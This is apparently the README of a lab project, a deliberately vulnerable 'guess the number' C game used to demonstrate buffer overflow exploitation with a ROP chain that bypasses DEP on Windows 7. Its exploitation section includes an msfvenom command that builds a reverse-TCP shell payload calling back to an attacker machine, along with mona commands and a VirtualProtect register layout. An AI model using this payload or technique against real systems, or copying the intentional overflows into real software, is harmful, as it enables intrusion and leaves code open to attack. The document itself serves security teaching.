# GuesstheNumber
## About the Software
GuesstheNumber is a simple CLI game to guess a 4 digits number. A player is required to enter their name in the passcode file. The  application reads the name from the file and asks the user to enter number of attempts to guess the number, which is randomly generated in the background. If the user guesses the number within the chosen number of attempts it displays "You Won!" otherwise game ends with "Better luck next time!". The primary purpose of the game is to demonstrate buffer overflow vulnerabilities in  C functions (eg. strcpy, scanf) and demonstrate how they can be exploited using Return Oriented Programming (ROP) technique despite modern Operating Systems such as Windows 7 having protection mechanisms such as Dynamic Execution Prevention(DEP), Address Space Layout Randomization (ASLR) etc.

## Folder Structure 

Folder structure for the files submitted is as below
| Folder | Files|
|-------------|----------------------------|
|App          |guessthenumber.c guessdll.c |
|DEP Demo     |DEPBypassDemo_z5307356.mp4  |
|Exploit      | exploit.py exploit2.py     |   
|Makefile     |   Makefile                 |
|             | .gitignore                 |
|             |ReadMe.md                   |

## Compiling the Software
Binaries have been provided and no further change to the source code is required before compiling the software. Further details are in the section below.

> Note Makefile is supplied but is not guaranteed to work.

Use the MinGW C compiler for Windows.
- First compile the dll file:
```sh
gcc.exe -c guessdll.c
gcc.exe -shared -o guessdll.dll -Wl,--out-implib=guessdll.a -Wl,--image-base=0x62500000 guessdll.o
```

- Then compile the main program:
```sh
gcc.exe guessthenumber.c -o guess.exe -Wl,--image-base=0x63600000 -lws2_32 ./guessdll.a
```
## Running the Software
Steps for running the Software as below:
- Please makes sure that the guess.exe, guessdll.dll and passcode.txt are in the same directory. otherwise the program will not read the passcode and bufferoverflow will not occur.
- For debugging purposes Immunity Debugger can be used to control the flow of the program and conduct deeper analysis of registers, stack, machine code and  bypass DEP.

## Operating Systems
- Windows 7 Professional Service Pack 1 - Victim Machine 
- Kali 2022.3 - Attacker 

## Virtual Machine 
- VirtualBox 6.1 
- For the first exploit make sure that there is connectivity between the vitrual machines and IP address is updated accordingly when building the shellcode. To configure network connectivity go to setting -> Select Network -> Under Adapter 1 tab select NAT network and enter a name. Make sure that the name is same for both Windows and Kali machine 
- Also, under Setting  select system and make sure that the Enable PAE/NX box is ticked under processor tab.

## Programming Languages
- GuesstheNumber game developed in C Programming language and compiled using MINGW compiler
- Exploit Developed in Python 2.7 

## Exploitation 
Enable DEP in the target machine 
- right click on Computer and select Properties 
- click on Advanced System Settings and open the "Advanced" tab
- Under "Performance" click on "Settings" and go to Data Execution prevention
- Click on the radio button "Turn on DEP for all programs and services except those I select.
- Restart the Machine 

Generating Reverse TCP Shellcode 
-   msfvenom -n 100 -p windows/shell_reverse_tcp -f python -x x86 --platform windows -b         "\x00\x0d\x0a\x2f" -e x86/shiakata_ga_nai LHOST=192.168.10.5 LPORT=443 > reverse_tcp1.sc where LHOST is IP Address of Kali Machine

Win API Funtion Used to Bypass DEP is VirtualProtect
-   BOOL VirtualProtect(     => Pointer to VirtualProtect
  [in]  LPVOID lpAddress,    => Return Address
  [in]  SIZE_T dwSize,       => value is 0x201
  [in]  DWORD  flNewProtect, =>value is 0x40    
  [out] PDWORD lpflOldProtect => writable pointer 
);
- To achieve the above we need following values in the register and the exploit file is written to capture the following 
EAX - No Operations with value 90909090
ECX - Writable Pointer =>lpflOldProtect
EDX - 00000040 => flNewProtect
EBX - 00000201 => dwSize
ESP - No action required
EBP - JMP ESP or PUSH ESP & RETN
ESI - Pointer to virtual Protect 
EDI - same as EIP

Before configuring the above details for the registers check if the bufferflow happens by injecting 500 A's 
Then find the offset for the EIP using the pattern generated by mona using the command 
```sh
!mona pattern_create 500
!mona suggest 
````
Find the return address in the guessdll file and include it in the exploit and develop the ROP chain as per the instruction above followed by NOP SLED.Shellcode for Calc (exploit2.py ) or Reverse_TCP(exploit.py) is added to the exploit followed by junk.
Please check the exploit files for further details.

## Exploit files 
There are two exploit files inclduded in this submission
- first one to bypass DEP and execute Reverse Shell connection to the Kali Machine
- second one bypass DEP and dispaly calc in the local Windows machine. Demonstration inclduded in the submission.

## Generating Shellcode 
Use the following command to generate shellcode
```sh
python exploit.py
```
Once shellcode file 'passcode.txt'is generated copy it to the directory where guess.exe and guessdll.dll files exist.

## References 
1. https://www.youtube.com/watch?v=HUfNUqsyb88&t=323s
2. https://h0mbre.github.io/Creating_Win32_ROP_Chains/#
3. https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
4. https://tahadraidia.com/posts/alternative-to-jmp-esp/
5. https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/
6. https://www.youtube.com/watch?v=eMUqjImJDXo
7. https://www.thegeekstuff.com/2013/06/buffer-overflow/
8. https://www.slideshare.net/CeSeNA/exploit-techniques-8833216?next_slideshow=8833216
9. http://grey-corner.blogspot.com

## Warning 
UNDER NO CIRCUMSTANCES SHOULD THIS SOFTWARE BE RUN ON ANY SYSTEM THAT IS CONNECTED TO AN UNTRUSTED NETWORK OR THAT PERFORMS CRITICAL FUNCTIONS. THE AUTHOR IS NOT RESPONSIBLE FOR ANY DAMAGES THAT MAY OCCUR FROM USING THIS SOFTWARE IN THIS OR ANY OTHER MANNER. USE AT YOUR OWN RISK.

>Author -Bibek Bhandari - Enterprise Architect and Independent Security Researcher
